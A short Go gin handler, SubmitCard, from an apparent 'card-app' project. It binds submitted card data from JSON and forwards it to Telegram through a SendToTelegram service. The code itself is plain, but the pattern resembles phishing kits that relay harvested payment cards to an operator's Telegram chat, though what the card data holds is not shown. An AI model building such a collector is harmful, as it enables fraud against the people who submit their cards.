package handlers

import (
	"card-app/api/models"
	"card-app/api/services"
	"net/http"

	"github.com/gin-gonic/gin"
)

func SubmitCard(ctx *gin.Context) {
	var data models.CardData
	if err := ctx.ShouldBindJSON(&data); err != nil {
		ctx.JSON(http.StatusBadRequest, gin.H{"error": "invalid inputs"})
		return
	}

	if err := services.SendToTelegram(data); err != nil {
		ctx.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to send to telegram"})
		return
	}

	ctx.JSON(http.StatusOK, gin.H{"status": "success"})
}
